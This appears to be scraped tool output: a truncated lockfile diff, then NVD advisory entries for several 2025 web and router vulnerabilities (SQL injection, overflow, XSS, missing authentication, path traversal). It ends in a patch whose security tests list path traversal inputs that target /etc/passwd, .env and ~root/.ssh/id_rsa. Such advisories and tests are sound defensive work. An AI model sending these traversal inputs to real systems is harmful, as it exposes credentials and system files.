+    {file = "llama_index_indices_managed_llama_cloud-0.6.10-py3-none-any.whl", hash = "sha256:de934c7be1957415ca7ec5aab3be973128f790f7c457fb4a402eafecd30370f5"},
+    {file = "llama_index_indices_managed_llama_cloud-0.6.10.tar.gz", hash = "sha256:948ecf45c4d8b96cb4fe946aebfa6593cd9e5edbe16e5f1072249c7b3c56d3b5"},
 ]
 
 [package.dependencies]
@@ -2221,20 +2223,20 @@ pygments = ">2.12.0"
 
 [[package]]
 name = "mkdocs-material"
-version = "9.6.9"
+version = "9.6.11"
 description = "Documentation that simply works"
 optional = false
 python-versions = ">=3.8"
 files = [
-    {file = "mkdocs_material-9.6.9-py3-none-any.whl", hash = "sha256:6e61b7fb623ce2aa4622056592b155a9eea56ff3487d0835075360be45a4c8d1"},
-    {file = "mkdocs_material-9.6.9.tar.gz", hash = "sha256:a4872139715a1f27b2aa3f3dc31a9794b7bbf36333c0ba4607cf04786c94f89c"},
+    {file = "mkdocs_material-9.6.11-py3-none-any.whl", hash = "sha256:47f21ef9cbf4f0ebdce78a2ceecaa5d413581a55141e4464902224ebbc0b1263"},
+    {file = "mkdocs_material-9.6.11.tar.gz", hash = "sha256:0b7f4a0145c5074cdd692e4362d232fb25ef5b23328d0ec1ab287af77cc0deff"},
 ]
 
 [package.dependencies]
 babel = ">=2.10,<3.0"
 backrefs = ">=5.7.post1,<6.0"
 colorama = ">=0.4,<1.0"
-jinja2 = ">=3.0,<4.0"
+jinja2 = ">=3.1,<4.0"
 markdown = ">=3.2,<4.0"
 mkdocs = ">=1.6,<2.0"
 mkdocs-material-extensions = ">=1.3,<2.0"
@@ -2320,103 +2322,103 @@ mkdocstrings = ">=0.25"
 
 [[package]]
 name = "multidict"
-version = "6.2.0"
+version = "6.3.1"
 description = "multidict implementation"
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "multidict-6.2.0-cp310-cp310-macosx_10_9_universal2.whl", hash = "sha256:b9f6392d98c0bd70676ae41474e2eecf4c7150cb419237a41f8f96043fcb81d1"},
-    {file = "multidict-6.2.0-cp310-cp310-macosx_10_9_x86_64.whl", hash = "sha256:3501621d5e86f1a88521ea65d5cad0a0834c77b26f193747615b7c911e5422d2"},
-    {file = "multidict-6.2.0-cp310-cp310-macosx_11_0_arm64.whl", hash = "sha256:32ed748ff9ac682eae7859790d3044b50e3076c7d80e17a44239683769ff485e"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:cc826b9a8176e686b67aa60fd6c6a7047b0461cae5591ea1dc73d28f72332a8a"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:214207dcc7a6221d9942f23797fe89144128a71c03632bf713d918db99bd36de"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:05fefbc3cddc4e36da209a5e49f1094bbece9a581faa7f3589201fd95df40e5d"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:e851e6363d0dbe515d8de81fd544a2c956fdec6f8a049739562286727d4a00c3"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:32c9b4878f48be3e75808ea7e499d6223b1eea6d54c487a66bc10a1871e3dc6a"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_aarch64.whl", hash = "sha256:7243c5a6523c5cfeca76e063efa5f6a656d1d74c8b1fc64b2cd1e84e507f7e2a"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_i686.whl", hash = "sha256:0e5a644e50ef9fb87878d4d57907f03a12410d2aa3b93b3acdf90a741df52c49"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_ppc64le.whl", hash = "sha256:0dc25a3293c50744796e87048de5e68996104d86d940bb24bc3ec31df281b191"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_s390x.whl", hash = "sha256:a49994481b99cd7dedde07f2e7e93b1d86c01c0fca1c32aded18f10695ae17eb"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_x86_64.whl", hash = "sha256:641cf2e3447c9ecff2f7aa6e9eee9eaa286ea65d57b014543a4911ff2799d08a"},
-    {file = "multidict-6.2.0-cp310-cp310-win32.whl", hash = "sha256:0c383d28857f66f5aebe3e91d6cf498da73af75fbd51ced
... [truncated]

================================================================================


CVE ID: CVE-2025-7121
Published: 2025-07-07T09:15:27.290
Modified: 2025-07-08T18:29:57.147
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Complaint Management System 1.0. It has been classified as critical. This affects an unknown part of the file /users/complaint-details.php. The manipulation of the argument cid leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/44 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315033 [Permissions Required]
  3. https://vuldb.com/?id.315033 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605913 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315033 ---
cid

================================================================================


CVE ID: CVE-2025-7120
Published: 2025-07-07T09:15:27.097
Modified: 2025-07-08T18:32:24.210
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Complaint Management System 1.0 and classified as critical. Affected by this issue is some unknown functionality of the file /users/check_availability.php. The manipulation of the argument email leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/43 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315032 [Permissions Required]
  3. https://vuldb.com/?id.315032 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605912 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315032 ---
email

================================================================================


CVE ID: CVE-2025-7119
Published: 2025-07-07T08:15:25.787
Modified: 2025-07-09T15:26:56.123
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in Campcodes Complaint Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /users/index.php. The manipulation of the argument Username leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/42 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.315031 [Permissions Required]
  3. https://vuldb.com/?id.315031 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605911 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315031 ---
username

================================================================================


CVE ID: CVE-2025-7118
Published: 2025-07-07T08:15:25.603
Modified: 2025-07-08T16:18:34.923
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability, which was classified as critical, has been found in UTT HiPER 840G up to 3.1.1-190328. This issue affects some unknown processing of the file /goform/formPictureUrl. The manipulation of the argument importpictureurl leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/d2pq/cve/blob/main/616/8.md
  2. https://github.com/d2pq/cve/blob/main/616/8.md#poc
  3. https://vuldb.com/?ctiid.315029
  4. https://vuldb.com/?id.315029
  5. https://vuldb.com/?submit.605875

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315029 ---
importpictureurl

================================================================================


CVE ID: CVE-2025-7117
Published: 2025-07-07T07:15:24.563
Modified: 2025-07-08T16:18:34.923
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical was found in UTT HiPER 840G up to 3.1.1-190328. This vulnerability affects unknown code of the file /goform/websWhiteList. The manipulation of the argument addHostFilter leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/d2pq/cve/blob/main/616/9.md
  2. https://github.com/d2pq/cve/blob/main/616/9.md#poc
  3. https://vuldb.com/?ctiid.315028
  4. https://vuldb.com/?id.315028
  5. https://vuldb.com/?submit.605864

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315028 ---
addHostFilter

================================================================================


CVE ID: CVE-2025-7116
Published: 2025-07-07T07:15:24.313
Modified: 2025-07-08T16:18:34.923
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical has been found in UTT 进取 750W up to 3.2.2-191225. This affects an unknown part of the file /goform/Fast_wireless_conf. The manipulation of the argument ssid leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/d2pq/cve/blob/main/616/10.md
  2. https://github.com/d2pq/cve/blob/main/616/10.md#poc
  3. https://vuldb.com/?ctiid.315027
  4. https://vuldb.com/?id.315027
  5. https://vuldb.com/?submit.605862

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315027 ---
ssid

================================================================================


CVE ID: CVE-2025-7115
Published: 2025-07-07T06:15:30.590
Modified: 2025-07-08T16:18:34.923
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-287: Improper Authentication
  - CWE-306: Missing Authentication for Critical Function

Description:
A vulnerability was found in rowboatlabs rowboat up to 8096eaf63b5a0732edd8f812bee05b78e214ee97. It has been rated as critical. Affected by this issue is the function PUT of the file apps/rowboat/app/api/uploads/[fileId]/route.ts of the component Session Handler. The manipulation of the argument params leads to missing authentication. The attack may be launched remotely. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available. It is expected that this issue will be fixed in the near future.

References (5):
  1. https://github.com/rowboatlabs/rowboat/issues/166
  2. https://github.com/rowboatlabs/rowboat/issues/166#issuecomment-2995195594
  3. https://vuldb.com/?ctiid.315026
  4. https://vuldb.com/?id.315026
  5. https://vuldb.com/?submit.604899

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315026 ---
PUT

PUT

params

================================================================================


CVE ID: CVE-2025-7114
Published: 2025-07-07T06:15:30.230
Modified: 2025-07-08T16:18:34.923
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-287: Improper Authentication
  - CWE-306: Missing Authentication for Critical Function

Description:
A vulnerability was found in SimStudioAI sim up to 37786d371e17d35e0764e1b5cd519d873d90d97b. It has been declared as critical. Affected by this vulnerability is the function POST of the file apps/sim/app/api/files/upload/route.ts of the component Session Handler. The manipulation of the argument Request leads to missing authentication. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/vri-report/reports/issues/3
  2. https://vuldb.com/?ctiid.315025
  3. https://vuldb.com/?id.315025
  4. https://vuldb.com/?submit.604898

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315025 ---
POST

POST

request

================================================================================


CVE ID: CVE-2025-7113
Published: 2025-07-07T05:15:42.853
Modified: 2025-08-13T14:42:29.990
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability was found in Portabilis i-Educar 2.9.0. It has been classified as problematic. Affected is an unknown function of the file /module/ComponenteCurricular/edit?id=ID of the component Curricular Components Module. The manipulation of the argument Nome leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README15.md [Broken Link]
  2. https://vuldb.com/?ctiid.315024 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315024 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604879 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315024 ---
Nome

================================================================================


CVE ID: CVE-2025-7112
Published: 2025-07-07T05:15:42.607
Modified: 2025-08-13T14:42:38.533
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability was found in Portabilis i-Educar 2.9.0 and classified as problematic. This issue affects some unknown processing of the file /intranet/educar_funcao_det.php?cod_funcao=COD&ref_cod_instituicao=COD of the component Function Management Module. The manipulation of the argument Função leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README14.md [Broken Link]
  2. https://vuldb.com/?ctiid.315023 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315023 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604824 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315023 ---
Função

================================================================================


CVE ID: CVE-2025-7111
Published: 2025-07-07T05:15:42.367
Modified: 2025-08-13T14:42:34.370
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability has been found in Portabilis i-Educar 2.9.0 and classified as problematic. This vulnerability affects unknown code of the file /intranet/educar_curso_det.php?cod_curso=ID of the component Course Module. The manipulation of the argument Curso leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README13.md [Broken Link]
  2. https://vuldb.com/?ctiid.315022 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315022 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604822 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315022 ---
Curso

================================================================================


CVE ID: CVE-2025-7110
Published: 2025-07-07T04:15:31.707
Modified: 2025-08-13T14:42:42.313
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability, which was classified as problematic, was found in Portabilis i-Educar 2.9.0. This affects an unknown part of the file /intranet/educar_escola_lst.php of the component School Module. The manipulation of the argument Escola leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README12.md [Broken Link]
  2. https://vuldb.com/?ctiid.315021 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315021 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604802 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315021 ---
Escola

================================================================================


CVE ID: CVE-2025-7109
Published: 2025-07-07T03:15:30.730
Modified: 2025-08-13T14:42:45.537
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability, which was classified as problematic, has been found in Portabilis i-Educar 2.9.0. Affected by this issue is some unknown functionality of the file /intranet/educar_aluno_beneficio_lst.php of the component Student Benefits Registration. The manipulation of the argument Benefício leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README11.md [Broken Link]
  2. https://vuldb.com/?ctiid.315020 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315020 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604790 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315020 ---
Benefício

================================================================================


CVE ID: CVE-2025-7108
Published: 2025-07-07T03:15:30.547
Modified: 2025-07-08T16:18:34.923
CVSS Score: 5.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability classified as critical was found in risesoft-y9 Digital-Infrastructure up to 9.6.7. Affected by this vulnerability is the function deleteFile of the file /Digital-Infrastructure-9.6.7/y9-digitalbase-webapp/y9-module-filemanager/risenet-y9boot-webapp-filemanager/src/main/java/net/risesoft/y9public/controller/Y9FileController.java. The manipulation of the argument fullPath leads to path traversal. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250621-01.md
  2. https://vuldb.com/?ctiid.315019
  3. https://vuldb.com/?id.315019
  4. https://vuldb.com/?submit.601825

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315019 ---
deleteFile

deleteFile

fullPath

================================================================================


CVE ID: CVE-2025-7107
Published: 2025-07-07T03:15:30.363
Modified: 2025-07-08T16:18:34.923
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability classified as critical has been found in SimStudioAI sim up to 0.1.17. Affected is the function handleLocalFile of the file apps/sim/app/api/files/parse/route.ts. The manipulation of the argument filePath leads to path traversal. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The patch is identified as b2450530d1ddd0397a11001a72aa0fde401db16a. It is recommended to apply a patch to fix this issue.

References (8):
  1. https://github.com/simstudioai/sim/commit/b2450530d1ddd0397a11001a72aa0fde401db16a
  2. https://github.com/simstudioai/sim/pull/437
  3. https://github.com/vri-report/reports/issues/2
  4. https://github.com/vri-report/reports/issues/2#issue-3161840085
  5. https://vuldb.com/?ctiid.315018
  6. https://vuldb.com/?id.315018
  7. https://vuldb.com/?submit.601043
  8. https://github.com/vri-report/reports/issues/2

Attempting to extract code examples from references...

--- Code from https://github.com/simstudioai/sim/commit/b2450530d1ddd0397a11001a72aa0fde401db16a ---
From b2450530d1ddd0397a11001a72aa0fde401db16a Mon Sep 17 00:00:00 2001
From: Waleed Latif <walif6@gmail.com>
Date: Thu, 29 May 2025 18:20:19 -0700
Subject: [PATCH] refactor(agent-handler): simplify agent handler, update
 tests, fix resolution of env vars in function execution (#437)

* refactored agent handler, fixed envvar resolution for function block

* resolve missing envvar resolution from function execution for custom tool

* fix path traversal risk

* removed extraneous comments

* ack PR comments
---
 apps/sim/app/api/files/parse/route.test.ts    |  223 ++-
 apps/sim/app/api/files/parse/route.ts         |   82 +-
 apps/sim/app/api/function/execute/route.ts    |   14 +-
 apps/sim/app/api/providers/route.ts           |    4 +
 apps/sim/app/chat/[subdomain]/chat-client.tsx |   15 -
 .../message-container/message-container.tsx   |   15 +
 .../handlers/agent/agent-handler.test.ts      |  119 +-
 .../executor/handlers/agent/agent-handler.ts  | 1193 ++++++++---------
 apps/sim/executor/handlers/agent/types.ts     |   35 +
 .../function/function-handler.test.ts         |   24 +-
 .../handlers/function/function-handler.ts     |    1 +
 apps/sim/providers/anthropic/index.ts         |    1 +
 apps/sim/providers/deepseek/index.ts          |    1 +
 apps/sim/providers/google/index.ts            |    1 +
 apps/sim/providers/openai/index.ts            |    1 +
 apps/sim/providers/types.ts                   |    1 +
 apps/sim/stores/custom-tools/store.ts         |   40 +-
 apps/sim/tools/function/execute.test.ts       |   16 +
 apps/sim/tools/function/execute.ts            |    9 +
 apps/sim/tools/function/types.ts              |    5 +
 apps/sim/tools/index.ts                       |    2 +-
 apps/sim/tools/utils.ts                       |    7 +-
 22 files changed, 1068 insertions(+), 741 deletions(-)
 create mode 100644 apps/sim/executor/handlers/agent/types.ts

diff --git a/apps/sim/app/api/files/parse/route.test.ts b/apps/sim/app/api/files/parse/route.test.ts
index 510de5bf52..4258b5dd91 100644
--- a/apps/sim/app/api/files/parse/route.test.ts
+++ b/apps/sim/app/api/files/parse/route.test.ts
@@ -1,4 +1,5 @@
 import path from 'path'
+import { NextRequest } from 'next/server'
 /**
  * Tests for file parse API route
  *
@@ -6,10 +7,9 @@ import path from 'path'
  */
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import { createMockRequest } from '@/app/api/__test-utils__/utils'
+import { POST } from './route'
 
-// Create actual mocks for path functions that we can use instead of using vi.doMock for path
 const mockJoin = vi.fn((...args: string[]): string => {
-  // For the UPLOAD_DIR paths, just return a test path
   if (args[0] === '/test/uploads') {
     return `/test/uploads/${args[args.length - 1]}`
   }
@@ -17,7 +17,6 @@ const mockJoin = vi.fn((...args: string[]): string => {
 })
 
 describe('File Parse API Route', () => {
-  // Mock file system and parser modules
   const mockReadFile = vi.fn().mockResolvedValue(Buffer.from('test file content'))
   const mockWriteFile = vi.fn().mockResolvedValue(undefined)
   const mockUnlink = vi.fn().mockResolvedValue(undefined)
@@ -36,15 +35,12 @@ describe('File Parse API Route', () => {
   beforeEach(() => {
     vi.resetModules()
 
-    // Reset all mocks
     vi.resetAllMocks()
 
-    // Create a test upload file that exists for all tests
     mockReadFile.mockResolvedValue(Buffer.from('test file content'))
     mockAccessFs.mockResolvedValue(undefined)
     mockStatFs.mockImplementation(() => ({ isFile: () => true }))
 
-    // Mock filesystem operations
     vi.doMock('fs', () => ({
       existsSync: vi.fn().mockReturnValue(true),
       constants: { R_OK: 4 },
@@ -63,19 +59,16 @@ describe('File Parse API Route', () => {
       stat: mockStatFs,
     }))
 
-    // Mock the S3 client
     vi.doMock('@/lib/uploads/s3-client', () => ({
       downloadFromS3: mockDownloadFromS3,
     }))
 
-    // Mock file parsers
     vi.doMock('@/lib/file-parsers', () => ({
       isSupportedFileType: vi.fn().mockReturnValue(true),
       parseFile: mockParseFile,
       parseBuffer: mockParseBuffer,
     }))
 
-    // Mock path module with our custom join function
     vi.doMock('path', () => {
       return {
         ...path,
@@ -85,7 +78,6 @@ describe('File Parse API Route', () => {
       }
     })
 
-    // Mock the logger
     vi.doMock('@/lib/logs/console-logger', () => ({
       createLogger: vi.fn().mockReturnValue({
         info: vi.fn(),
@@ -95,7 +87,6 @@ describe('File Parse API Route', () => {
       }),
     }))
 
-    // Configure upload directory and S3 mode
     vi.doMock('@/lib/uploads/setup', () => ({
       UPLOAD_DIR: '/test/uploads',
       USE_S3_STORAGE: false,
@@ -105,7 +96,6 @@ describe('File Parse API Route', () => {
       },
     }))
 
-    // Skip setup.server.ts side effects
     vi.doMock('@/lib/uploads/setup.server', () => ({}))
   })
 
@@ -113,7 +103,6 @@ describe('File Parse API Route', () => {
     vi.clearAllMocks()
   })
 
-  // Basic tests testing the API structure
   it('should handle missing file path', async () => {
     const req = createMockRequest('POST', {})
     const { POST } = await import('./route')
@@ -125,47 +114,37 @@ describe('File Parse API Route', () => {
     expect(data).toHaveProperty('error', 'No file path provided')
   })
 
-  // Test skipping the implementation details and testing what users would care about
   it('should accept and process a local file', async () => {
-    // Given: A request with a file path
     const req = createMockRequest('POST', {
       filePath: '/api/files/serve/test-file.txt',
     })
 
-    // When: The API processes the request
     const { POST } = await import('./route')
     const response = await POST(req)
     const data = await response.json()
 
-    // Then: Check the API contract without making assumptions about implementation
     expect(response.status).toBe(200)
-    expect(data).not.toBeNull() // We got a response
+    expect(data).not.toBeNull()
 
-    // The response either has a success indicator with output OR an error
     if (data.success === true) {
       expect(data).toHaveProperty('output')
     } else {
-      // If error, there should be an error message
       expect(data).toHaveProperty('error')
       expect(typeof data.error).toBe('string')
     }
   })
 
   it('should process S3 files', async () => {
-    // Given: A request with an S3 file path
     const req = createMockRequest('POST', {
       filePath: '/api/files/serve/s3/test-file.pdf',
     })
 
-    // When: The API processes the request
     const { POST } = await import('./route')
     const response = await POST(req)
     const data = await response.json()
 
-    // Then: We should get a response with parsed content or error
     expect(response.status).toBe(200)
 
-    // The data should either have a success flag with output or an error
     if (data.success === true) {
       expect(data).toHaveProperty('output')
     } else {
@@ -174,17 +153,14 @@ describe('File Parse API Route', () => {
   })
 
   it('should handle multiple files', async () => {
-    // Given: A request with multiple file paths
     const req = createMockRequest('POST', {
       filePath: ['/api/files/serve/file1.txt', '/api/files/serve/file2.txt'],
     })
 
-    // When: The API processes the request
     const { POST } = await import('./route')
     const response = await POST(req)
     const data = await response.json()
 
-    // Then: We get an array of results
     expect(response.status).toBe(200)
     expect(data).toHaveProperty('success')
     expect(data).toHaveProperty('results')
@@ -193,20 +169,16 @@ describe('File Parse API Route', () => {
   })
 
   it('should handle S3 access errors gracefully', async () => {
-    // Given: S3 will throw an error
     mockDownloadFromS3.mockRejectedValueOnce(new Error('S3 access denied'))
 
-    // And: A request with an S3 file path
     const req = createMockRequest('POST', {
       filePath: '/api/files/serve/s3/access-denied.pdf',
     })
 
-    // When: The API processes the request
     const { POST } = await import('./route')
     const response = await POST(req)
     const data = await response.json()
 
-    // Then: We get an appropriate error
     expect(response.status).toBe(200)
     expect(data).toHaveProperty('success', false)
     expect(data).toHaveProperty('error')
@@ -214,22 +186,203 @@ describe('File Parse API Route', () => {
   })
 
   it('should handle access errors gracefully', async () => {
-    // Given: File access will fail
     mockAccessFs.mockRejectedValueOnce(new Error('ENOENT: no such file'))
 
-    // And: A request with a nonexistent file
     const req = createMockRequest('POST', {
       filePath: '/api/files/serve/nonexistent.txt',
     })
 
-    // When: The API processes the request
     const { POST } = await import('./route')
     const response = await POST(req)
     const data = await response.json()
 
-    // Then: We get an appropriate error response
     expect(response.status).toBe(200)
     expect(data).toHaveProperty('success')
     expect(data).toHaveProperty('error')
   })
 })
+
+describe('Files Parse API - Path Traversal Security', () => {
+  beforeEach(() => {
+    vi.clearAllMocks()
+  })
+
+  describe('Path Traversal Prevention', () => {
+    it('should reject path traversal attempts with .. segments', async () => {
+      const maliciousRequests = [
+        '../../../etc/passwd',
+        '/api/files/serve/../../../etc/passwd',
+        '/api/files/serve/../../app.js',
+        '/api/files/serve/../.env',
+        'uploads/../../../etc/hosts',
+      ]
+
+      for (const maliciousPath of maliciousRequests) {
+        const request = new NextRequest('http://localhost:3000/api/files/parse', {
+          method: 'POST',
+          body: JSON.stringify({
+            filePath: maliciousPath,
+          }),
+        })
+
+        const response = await POST(request)
+        const result = await response.json()
+
+        expect(result.success).toBe(false)
+        expect(result.error).toMatch(/Access denied|Invalid path|Path outside allowed directory/)
+      }
+    })
+
+    it('should reject paths with tilde characters', async () => {
+      const maliciousPaths = [
+        '~/../../etc/passwd',
+        '/api/files/serve/~/secret.txt',
+        '~root/.ssh/id_rsa',
+      ]
+
+      for (const maliciousPath of maliciousPaths) {
+        const request = new NextRequest('http://localhost:3000/api/files/parse', {
+          method: 'POST',
+          body: JSON.stringify({
